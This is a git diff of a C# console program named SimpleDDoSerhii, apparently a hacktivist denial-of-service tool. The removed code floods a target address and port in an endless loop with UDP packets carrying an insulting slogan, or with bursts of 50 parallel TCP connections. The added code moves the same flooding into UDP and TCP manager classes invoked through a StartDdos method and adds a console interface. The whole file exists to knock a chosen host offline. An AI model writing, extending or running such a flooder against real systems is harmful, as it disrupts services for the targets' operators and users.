@@ -1,11 +1,7 @@
 ﻿using System;
-using System.Linq;
-using System.Net;
-using System.Net.Sockets;
 using System.Text;
-using System.Threading;
-using System.Threading.Tasks;
-
+using SimpleDDoSerhii.Clients;
+using SimpleDDoSerhii.Entites;
 namespace SimpleDDoSerhii
 {
     class Program
@@ -14,21 +10,16 @@ namespace SimpleDDoSerhii
         {
             try
             {
-                var rand = new Random().Next(1, 14);
-                Console.ForegroundColor = (ConsoleColor)rand;
                 if (args.Length == 0)
                 {
-                    Console.WriteLine("Empty arguments");
-                    return;
+                    new ConsoleInterface();
                 }
-                
-                var endPointAddress = args[0];
-                var destinationPort = args.Length > 1 ? int.Parse(args[1]) : 53;
-                var protocol = args.Length > 2 ? args[2] : "UDP";
-
-                while (true)
+                else
                 {
-                    Up(endPointAddress, destinationPort, protocol);
+                    var endPointAddress = args[0];
+                    var destinationPort = args.Length > 1 ? int.Parse(args[1]) : 53;
+                    var protocol = args.Length > 2 ? args[2] : "UDP";
+                    Up(new NetworkCredentional { DestinationPort = destinationPort, EndPointAddress = endPointAddress, Protocol = protocol });
                 }
             }
             catch (Exception ex)
@@ -37,35 +28,26 @@ namespace SimpleDDoSerhii
             }
         }
 
-        private static void Up(string address, int port, string protocol)
+        private static void Up(NetworkCredentional nc)
         {
-            
-            var data = Encoding.UTF8.GetBytes("russkiy voenniy korabl - idi na xuy");
-            if (protocol.ToUpper().Equals("UDP"))
+            switch (nc.Protocol)
             {
-                var client = new UdpClient();
-                client.SendAsync(data, data.Length, address, port);
-                Console.WriteLine($"{DateTime.Now.ToLongTimeString()}: Sent to endpoint {address}:{port} By protocol: {protocol}");
+                case "UDP":
+                    StartDdos(new UdpManager(), nc);
+                    break;
+                case "TCP":
+                    StartDdos(new TcpManager(), nc);
+                    break;
+                default:
+                    StartDdos(new TcpManager(), nc);
+                    break;
             }
-            else
-            {
-                Parallel.For(0, 50, i =>
-                {
-                    try
-                    {
-                        var client = new TcpClient();
-                        client.ConnectAsync(address, port).Wait(10);
-                        client.Close();
-                        Console.WriteLine($"{DateTime.Now.ToLongTimeString()}: Sent to endpoint {address}:{port} By protocol: {protocol}");
-                    }
-                    catch (Exception e)
-                    {
-                    }
-                });
-                
-                
-            }
-
         }
+        public static void StartDdos(CreatorClientManager creator, NetworkCredentional networkCredentional)
+        {
+            creator.PoslatRusskiyKorabl(networkCredentional);
+        }
+
+
     }
 }
